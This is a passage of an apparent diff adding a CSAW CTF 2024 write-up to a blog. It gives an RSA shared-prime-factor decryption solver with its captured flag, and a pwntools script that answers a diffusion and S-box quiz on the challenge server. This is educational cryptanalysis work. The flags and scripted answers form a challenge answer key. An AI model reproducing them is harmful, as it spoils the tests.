+	<span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">a</span> 
+
+<span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">gcd(n1,n2)</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;GDC of n1 and n2:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">p)</span>
+
+<span style="color: #f8f8f2">q1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">n1</span><span style="color: #f92672">//</span><span style="color: #f8f8f2">p</span>
+<span style="color: #f8f8f2">q2</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">n2</span><span style="color: #f92672">//</span><span style="color: #f8f8f2">p</span>
+
+<span style="color: #75715e"># Sanity check</span>
+<span style="color: #66d9ef">assert</span> <span style="color: #f8f8f2">p</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">q1</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">n1</span>
+<span style="color: #66d9ef">assert</span> <span style="color: #f8f8f2">p</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">q2</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">n2</span>
+
+<span style="color: #f8f8f2">phin_1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">(p</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">(q1</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">phin_2</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">(p</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">(q2</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #f8f8f2">d1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pow(e,</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,phin_1)</span>
+<span style="color: #f8f8f2">d2</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pow(e,</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,phin_2)</span>
+
+<span style="color: #f8f8f2">m1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pow(c1,d1,n1)</span>
+<span style="color: #f8f8f2">m2</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pow(c2,d2,n2)</span>
+
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(binascii</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">unhexlify(</span><span style="color: #e6db74">&#39;0&#39;</span><span style="color: #f92672">+</span><span style="color: #f8f8f2">hex(m1)[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:])</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode())</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(binascii</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">unhexlify(hex(m2)[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:])</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode())</span>
+</pre></div>
+<p></p>
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span><span style="color: #e6db74">&quot;csawctf{n0_p0lyn0m1al_t1m3_f4ct0r1ng_n33d3d_t0_0p3n_th1s_tr4pd00r!}&quot;</span>
+</pre></div>
+
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>Diffusion Pop Quiz</h3></p>
+<img class="center" src="/assets/images/csaw24diffusionquiz.png">
+<p></p>
+<p>For this challenge we are given the following file and a url to a server to connect to.</p>
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #75715e"># To ensure correctly formatted answers for the challenge, use 1-indexed values for the output bits.</span>
+<span style="color: #75715e"># For example, if you have an S-Box of 8 bits to 8 bits, the first output bit is 1, the second is 2, and so forth.</span>
+<span style="color: #75715e"># Your ANF expression will have the variables y1, y2, ..., y8.</span>
+
+<span style="color: #75715e"># Put your S-Boxes here.</span>
+
+<span style="color: #f8f8f2">example</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span>
+
+<span style="color: #75715e"># 3 input bits: 000, 001, 010, 011, 100, 101, 110, 111</span>
+<span style="color: #75715e"># Array indexes: 0    1    2    3    4    5    6    7</span>
+<span style="color: #75715e"># f(x1,x2,x3):   0    1    0    0    0    1    1    1</span>
+
+<span style="color: #75715e"># Customize the following settings to extract specific bits of specific S-Boxes and have a comfortable visualization of terms.</span>
+
+<span style="color: #f8f8f2">SYMBOL</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;x&#39;</span>
+<span style="color: #f8f8f2">INPUT_BITS</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">3</span>
+<span style="color: #f8f8f2">OUTPUT_BITS</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">SBOX</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">example</span>
+<span style="color: #f8f8f2">BIT</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span>
+
+<span style="color: #75715e"># Ignore the functions, we&#39;ve implemented this for you to save your time.</span>
+<span style="color: #75715e"># Don&#39;t touch it, it might break and we don&#39;t want that, right? ;)</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_sbox_result</span><span style="color: #f8f8f2">(input_int):</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">SBOX[input_int]</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_term</span><span style="color: #f8f8f2">(binary_string):</span>
+    <span style="color: #f8f8f2">term</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;&quot;</span>
+    <span style="color: #f8f8f2">i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">(count,bit)</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">enumerate(binary_string):</span>
+        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">bit</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;1&quot;</span><span style="color: #f8f8f2">:</span>
+            <span style="color: #f8f8f2">term</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">SYMBOL</span><span style="color: #f92672">+</span><span style="color: #f8f8f2">str(i)</span><span style="color: #f92672">+</span><span style="color: #e6db74">&quot;*&quot;</span>
+        <span style="color: #f8f8f2">i</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+
+    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">term</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">:</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;1&quot;</span>
+
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">term[:</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_poly</span><span style="color: #f8f8f2">(inputs,</span> <span style="color: #f8f8f2">outputs):</span>
+    <span style="color: #f8f8f2">poly</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;&quot;</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">v</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">inputs:</span>
+        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">outputs[v]:</span>
+            <span style="color: #f8f8f2">poly</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">get_term(v)</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;+&quot;</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">poly[:</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">should_sum</span><span style="color: #f8f8f2">(u,</span> <span style="color: #f8f8f2">v,</span> <span style="color: #f8f8f2">n):</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(n):</span>
+        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">u[i]</span> <span style="color: #f92672">&gt;</span> <span style="color: #f8f8f2">v[i]:</span>
+            <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">False</span>
+
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">True</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_as</span><span style="color: #f8f8f2">(vs,</span> <span style="color: #f8f8f2">f,</span> <span style="color: #f8f8f2">n):</span>
+    <span style="color: #f8f8f2">a</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{}</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">v</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">vs:</span>
+        <span style="color: #f8f8f2">a[v]</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span>
+        <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">u</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">vs:</span>
+            <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">should_sum(u,</span> <span style="color: #f8f8f2">v,</span> <span style="color: #f8f8f2">n):</span>
+                <span style="color: #f8f8f2">a[v]</span> <span style="color: #f92672">^=</span> <span style="color: #f8f8f2">f[u]</span>
+
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">a</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_anf</span><span style="color: #f8f8f2">(vs,</span> <span style="color: #f8f8f2">f,</span> <span style="color: #f8f8f2">n):</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">get_poly(vs,</span> <span style="color: #f8f8f2">get_as(vs,</span> <span style="color: #f8f8f2">f,</span> <span style="color: #f8f8f2">n))</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_vs_and_fis_from_sbox</span><span style="color: #f8f8f2">(which_fi):</span>
+    <span style="color: #f8f8f2">vs</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+    <span style="color: #f8f8f2">fis</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{}</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">input_integer</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">2</span><span style="color: #f92672">**</span><span style="color: #f8f8f2">INPUT_BITS):</span>
+        <span style="color: #f8f8f2">sbox_output</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">get_sbox_result(input_integer)</span>
+        <span style="color: #f8f8f2">input_integer_binary</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bin(input_integer)[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">zfill(INPUT_BITS)</span>
+        <span style="color: #f8f8f2">fis[input_integer_binary]</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span>
+        <span style="color: #f8f8f2">sbox_output_binary</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bin(sbox_output)[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">zfill(OUTPUT_BITS)</span>
+
+        <span style="color: #f8f8f2">vs</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(input_integer_binary)</span>
+        <span style="color: #f8f8f2">fis[input_integer_binary]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">int(sbox_output_binary[which_fi</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">])</span>
+
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">vs,</span> <span style="color: #f8f8f2">fis</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">get_anf_from_sbox_fi</span><span style="color: #f8f8f2">(which_fi):</span>
+    <span style="color: #f8f8f2">vs,</span> <span style="color: #f8f8f2">fis</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">get_vs_and_fis_from_sbox(which_fi)</span>
+    <span style="color: #f8f8f2">poly</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">get_anf(vs,</span> <span style="color: #f8f8f2">fis,</span> <span style="color: #f8f8f2">INPUT_BITS)</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">poly</span>
+
+<span style="color: #f8f8f2">output</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">get_anf_from_sbox_fi(BIT)</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(output)</span>
+</pre></div>
+
+<p></p>
+
+<p>When connecting to the server we are presented with a series of questions about <a href="https://en.wikipedia.org/wiki/Confusion_and_diffusion"><b> diffusion</b></a> and <a href="https://en.wikipedia.org/wiki/S-box"><b> s-boxes</b></a>. Answering all of them correctly will give us the flag. For the first question we have to decrypt a simple <a href="https://en.wikipedia.org/wiki/Caesar_cipher"><b> Ceaser Cipher</b></a> and for the second one we are asked for the last entry in the <a href="https://en.wikipedia.org/wiki/Rijndael_S-box
+"><b> AES s-box</b></a>, which after a quick google search we can find out is "0x16". From here on out the questions mostly boil down to editing the global variables in the provided script. I left notes on my solver script about what specific questions were asking for and the state of the variables in the provided script:</p> 
+
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">pwn</span> <span style="color: #f92672">import</span> <span style="color: #f92672">*</span>
+<span style="color: #f92672">from</span> <span style="color: #f8f8f2">time</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">sleep</span>
+
+<span style="color: #f8f8f2">letters</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
+
+<span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">remote(b</span><span style="color: #e6db74">&quot;diffusion-pop-quiz.ctf.csaw.io&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">5000</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 1</span>
+
+<span style="color: #f8f8f2">dict</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{}</span>
+
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvuntil(</span><span style="color: #e6db74">&quot;Can you decrypt this? &quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #f8f8f2">cipherText</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvline()[</span><span style="color: #ae81ff">4</span><span style="color: #f8f8f2">:</span><span style="color: #f92672">-</span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode()</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Current ciphertext:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">cipherText)</span>
+
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">letter</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">letters:</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvuntil(</span><span style="color: #e6db74">&quot;What would you like to encrypt?&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(letter)</span>
+	<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">letter)</span>
+	<span style="color: #75715e">#sleep(0.2)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvuntil(</span><span style="color: #e6db74">&quot;Here is your encrypted text: &quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #75715e">#sleep(0.2)</span>
+	<span style="color: #f8f8f2">ct</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvline()[</span><span style="color: #ae81ff">4</span><span style="color: #f8f8f2">:</span><span style="color: #f92672">-</span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">decode()</span>
+	<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Corresponding ciphertext:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ct)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvuntil(</span><span style="color: #e6db74">&quot;Would you like to continue? (yes/no)&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;yes&quot;</span><span style="color: #f8f8f2">)</span>
+	<span style="color: #75715e">#sleep(0.2)</span>
+	<span style="color: #f8f8f2">dict[ct]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">letter</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;A&quot;</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;no&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Dictionary for Stage 1 completed:&quot;</span><span style="color: #f8f8f2">,dict)</span>
+
+<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;&quot;</span>
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">cipherText:</span>
+	<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">c</span> <span style="color: #f92672">!=</span> <span style="color: #e6db74">&quot; &quot;</span><span style="color: #f8f8f2">:</span>
+		<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">dict[c]</span>
+	<span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
+		<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">+=</span> <span style="color: #e6db74">&quot; &quot;</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Plaintext for Stage 1 found:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">plaintext)</span> <span style="color: #75715e"># Diffusion matters a lot</span>
+
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span>
+
+<span style="color: #75715e">#r.recvuntil(&quot;What was the original text?&quot;)</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(plaintext)</span>
+
+
+<span style="color: #75715e"># Question 2</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;0x16&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 3</span>
+
+<span style="color: #75715e"># State of the ANF script varibles:</span>
+<span style="color: #75715e"># INPUT_BITS = 3</span>
+<span style="color: #75715e"># OUTPUT_BITS = 1</span>
+<span style="color: #75715e"># SBOX = [0b0,0b1,0b0,0b0,0b0,0b1,0b1,0b1]</span>
+<span style="color: #75715e"># BIT = 1</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x3+x2*x3+x1*x2&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 4</span>
+
+<span style="color: #75715e"># State of the ANF script varibles:</span>
+<span style="color: #75715e"># INPUT_BITS = 3</span>
+<span style="color: #75715e"># OUTPUT_BITS = 2</span>
+<span style="color: #75715e"># SBOX = [0b01,0b10,0b00,0b00,0b01,0b11,0b11,0b10]</span>
+<span style="color: #75715e"># BIT = 1</span>
+
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x3+x2*x3+x1*x2&quot;</span><span style="color: #f8f8f2">)</span>
+
+
+<span style="color: #75715e"># Question 5</span>
+
+<span style="color: #75715e"># State of the ANF script varibles:</span>
+<span style="color: #75715e"># INPUT_BITS = 3</span>
+<span style="color: #75715e"># OUTPUT_BITS = 2</span>
+<span style="color: #75715e"># SBOX = [0b01,0b10,0b00,0b00,0b01,0b11,0b11,0b10]</span>
+<span style="color: #75715e"># BIT = 2</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;1+x3+x2+x2*x3+x1*x3+x1*x2&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 6</span>
+
+<span style="color: #75715e"># From here on out we&#39;re given 3 big s-boxes to use</span>
+<span style="color: #75715e"># sbox1 = [1, 45, 226, 147, 190, 69, 21, 174, 120, 3, 135, 164, 184, 56, 207, 63, 8, 103, 9, 148, 235, 38, 168, 107, 189, 24, 52, 27, 187, 191, 114, 247, 64, 53, 72, 156, 81, 47, 59, 85, 227, 192, 159, 216, 211, 243, 141, 177, 255, 167, 62, 220, 134, 119, 215, 166, 17, 251, 244, 186, 146, 145, 100, 131, 241, 51, 239, 218, 44, 181, 178, 43, 136, 209, 153, 203, 140, 132, 29, 20, 129, 151, 113, 202, 95, 163, 139, 87, 60, 130, 196, 82, 92, 28, 232, 160, 4, 180, 133, 74, 246, 19, 84, 182, 223, 12, 26, 142, 222, 224, 57, 252, 32, 155, 36, 78, 169, 152, 158, 171, 242, 96, 208, 108, 234, 250, 199, 217, 0, 212, 31, 110, 67, 188, 236, 83, 137, 254, 122, 93, 73, 201, 50, 194, 249, 154, 248, 109, 22, 219, 89, 150, 68, 233, 205, 230, 70, 66, 143, 10, 193, 204, 185, 101, 176, 210, 198, 172, 30, 65, 98, 41, 46, 14, 116, 80, 2, 90, 195, 37, 123, 138, 42, 91, 240, 6, 13, 71, 111, 112, 157, 126, 16, 206, 18, 39, 213, 76, 79, 214, 121, 48, 104, 54, 117, 125, 228, 237, 128, 106, 144, 55, 162, 94, 118, 170, 197, 127, 61, 175, 165, 229, 25, 97, 253, 77, 124, 183, 11, 238, 173, 75, 34, 245, 231, 115, 35, 33, 200, 5, 225, 102, 221, 179, 88, 105, 99, 86, 15, 161, 49, 149, 23, 7, 58, 40]</span>
+<span style="color: #75715e"># sbox2 = [152, 158, 42, 231, 197, 251, 250, 79, 39, 1, 96, 57, 146, 137, 178, 133, 170, 32, 212, 154, 73, 97, 78, 7, 204, 218, 9, 195, 88, 149, 71, 235, 199, 247, 211, 124, 33, 0, 219, 185, 77, 2, 81, 201, 164, 224, 76, 102, 69, 198, 181, 20, 28, 210, 147, 115, 226, 180, 80, 189, 150, 46, 166, 171, 248, 37, 227, 21, 13, 63, 228, 216, 191, 143, 103, 40, 184, 121, 246, 207, 61, 26, 98, 249, 174, 156, 155, 10, 176, 44, 123, 114, 100, 240, 70, 130, 188, 104, 252, 126, 15, 131, 239, 234, 122, 229, 134, 214, 31, 8, 127, 236, 65, 208, 255, 128, 93, 190, 83, 135, 47, 183, 22, 173, 112, 241, 106, 186, 53, 49, 193, 64, 237, 36, 16, 153, 94, 92, 165, 203, 116, 144, 12, 138, 172, 177, 5, 202, 215, 56, 66, 117, 132, 142, 59, 209, 17, 11, 27, 206, 151, 111, 162, 87, 225, 161, 159, 160, 244, 108, 67, 243, 253, 196, 140, 51, 107, 113, 84, 230, 118, 34, 220, 89, 6, 68, 213, 163, 58, 141, 221, 200, 54, 23, 182, 217, 14, 24, 222, 60, 62, 110, 38, 55, 74, 129, 50, 148, 72, 167, 136, 35, 30, 109, 205, 90, 238, 29, 194, 254, 41, 187, 85, 82, 101, 119, 192, 145, 157, 125, 223, 19, 4, 175, 45, 139, 232, 18, 86, 179, 95, 245, 91, 99, 105, 48, 120, 168, 3, 43, 233, 75, 25, 242, 52, 169]</span>
+<span style="color: #75715e"># sbox3 = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]</span>
+
+<span style="color: #75715e"># State of the ANF script varibles:</span>
+<span style="color: #75715e"># INPUT_BITS = 8</span>
+<span style="color: #75715e"># OUTPUT_BITS = 8</span>
